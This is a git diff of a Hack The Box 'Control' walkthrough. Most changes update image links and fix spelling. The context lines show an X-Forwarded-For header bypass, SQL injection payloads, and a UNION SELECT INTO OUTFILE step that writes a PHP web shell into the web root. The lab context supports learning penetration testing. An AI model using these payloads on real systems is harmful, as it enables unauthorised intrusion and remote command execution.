@@ -81,7 +81,7 @@ In the nmap we found some defautl ports open. Lets check the http page:
 
  
 
-<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-webpage.png" alt="control-webpage" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-webpage.png" alt="control-webpage" style="zoom:75%;" />
 
 
 
@@ -89,11 +89,11 @@ The fisrt thing came to my attention is the link **Admin** in  the right side, a
 
 
 
-<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-admin-webpage.png" alt="control-admin-webpage" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-admin-webpage.png" style="zoom:75%;" />
 
 
 
-Looking for something usefull in source page I saw this note write in the comments:
+Looking for something useful in source page I saw this note write in the comments:
 
 ````html
 <!-- To Do:
@@ -148,11 +148,11 @@ X-Forwarded-For         [Status: 200, Size: 7933, Words: 327, Lines: 154]
 
 So the **X-Forwarded-For** header works well. Lets install the extension **Modify Header Value**. After this we can access the  **Admin** page:
 
-<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-header-xforwarded-for.png" alt="control-header-xforwarded-for" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-header-xforwarded-for.png" style="zoom:75%;" />
 
 
 
-<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-admin-webpage-access.png" alt="control-admin-webpage-access" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-admin-webpage-access.png" style="zoom:75%;" />
 
 
 
@@ -226,7 +226,7 @@ X-Forwarded-For: 192.168.4.28
 productName=1
 ```
 
-<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-burp-request-1.png" alt="control-burp-request-1" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-burp-request-1.png" style="zoom:75%;" />
 
 
 
@@ -272,7 +272,7 @@ X-Forwarded-For: 192.168.4.28
 productName=' order by 1 -- #
 ```
 
-<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-order-by-1.png" alt="control-order-by-1" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-order-by-1.png" alt="control-order-by-1" style="zoom:75%;" />
 
 
 
@@ -295,7 +295,7 @@ X-Forwarded-For: 192.168.4.28
 productName=' order by 7 -- #
 ```
 
-<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-order-by-7.png" alt="control-order-by-7" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-order-by-7.png" alt="control-order-by-7" style="zoom:75%;" />
 
 
 
@@ -385,7 +385,7 @@ productName=' union select 1,2,3,4,5,"AAAAAAAAAA" INTO OUTFILE "C:\\inetpub\\www
 
 We get a **mysql** error, but if we try the same command again, **mysql** tell us that file already exist.
 
-<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-upload-file-error.png" alt="control-upload-file-error" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-upload-file-error.png" style="zoom:75%;" />
 
 
 
@@ -393,7 +393,7 @@ Thats right, beside the **mysql** error the file was created:
 
 
 
-![control-upload-dumb-txt](/home/dumb/Documents/learn-notes/htb-writeups/control/control-upload-dumb-txt.png)
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-upload-dumb-txt.png" alt="control-upload-dumb-txt" style="zoom:67%;" />
 
 
 
@@ -411,7 +411,7 @@ Lets create a simple php shell:
 productName=' union select 1,2,3,4,5,"<?php system($_REQUEST[\'cmd\']); ?>" INTO OUTFILE "C:\\inetpub\\wwwroot\\dumb.php"  -- #
 ````
 
-<img src="/home/dumb/Documents/learn-notes/htb-writeups/control/control-shell-command-whoami.png" alt="control-shell-command-whoami" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-shell-command-whoami.png" alt="control-shell-command-whoami" style="zoom:75%;" />
 
 
 
